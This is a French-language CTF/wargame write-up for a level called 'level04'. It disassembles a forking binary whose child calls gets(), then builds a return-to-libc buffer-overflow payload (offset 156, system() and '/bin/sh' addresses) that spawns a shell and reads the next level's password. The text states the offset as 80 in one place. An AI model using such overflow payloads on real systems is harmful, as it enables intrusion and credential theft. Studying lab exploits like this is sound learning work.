# Analyse

## Binaire

`./level04`
```
Give me some shellcode, k

```
`test`
```

child is exiting...
```
## Gdb

`info function`
```asm
[...]
  0x080486c8  main
[...]
```


`disas main`
```asm
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0                             ; 176 octets pour la stack
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax             ; int pid @ esp+0xac = fork();
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]                       ; input @ esp+0x20
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax             ; memset(buffer, 0, 32);
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0             ; int ret @ esp+0xa8 = 0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0             ; int status @ esp+0x1c = 0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>                 ; if pid != 0:  jump <+161> 
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>                ; prctl(1, 1);
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>               ; ptrace(0, 0, 0, 0);
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>                 ; puts("Give me some shellcode, k");
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>                 ; gets(input);
   0x08048763 <+155>:	jmp    0x804881a <main+338>                 ; jump <+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>                 ; wait(&status);
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>                 ; if status & 0x7f == 0: jump <+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>                 ; if (status & 0x7f) >> 1 <= 0: jump <+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>                 ; puts("child is exiting...");
   0x080487b8 <+240>:	jmp    0x804881a <main+338>                 ; return(0);
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax             ; ret = ptrace(3, pid, 44, 0)
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>                 ; if ret !== 11: jump <+160> (boucle)
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>                 ; puts("no exec() for you");
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>                 ; kill(pid, 9);
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0                              ; return(0);
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret
End of assembler dump.
```

# Exploit

Le programme crée un child process avec un fork() qui exécute un peu plus loin un appel à gets() sur l'input que nous contrôlons (donc vulnérable à un buffer overflow), puis return.

Le parent quant à lui boucle en suivant l'exécution du child, tant qu'il ne lance pas le syscall [11: execve()](https://redirect.cs.umbc.edu/courses/undergraduate/313/spring04/burt_katz/lectures/Lect07/syscall_offline.html):
Attend un changement de statut de l'enfant, s'il a été interrompu ou a quitté (cf. [waitstatus.h](https://github.com/lattera/glibc/blob/master/bits/waitstatus.h)), affiche "child is exiting..." et return(0); 

En sortie de boucle (l'enfant a tenté un execve()), il affiche "no exec() for you", le kill et retun(0);

La stack est exécutable, mais le check sur execve() nous empêche de lancer un shellcode classique donc on va opter pour la même approche que dans le level01: un [retour a la libc](https://beta.hackndo.com/retour-a-la-libc/).

Pour trouver l'offset on va devoir spécifier à gdb de suivre l'exécution du process enfant et se servir comme d'habitude du [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

`gdb level04`
`set follow-fork-mode child`
`r`
```
Starting program: /home/users/level04/level04
[New process 3213]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3213]
0x41326641 in ?? ()
```
- Le générateur de pattern nous indique un offset de 156 pour la valeur 0x41326641

Notre exploit sera composé comme suit: [ Offset de 80 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
- L'adresse de system() est 0xf7e6aed0 (\xd0\xae\xe6\xf7)

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
- L'adresse de "/bin/sh" est 0xf7f897ec (\xec\x97\xf8\xf7)

`(python -c 'print "\x90" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"'; cat - ) | ./level04`
```
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
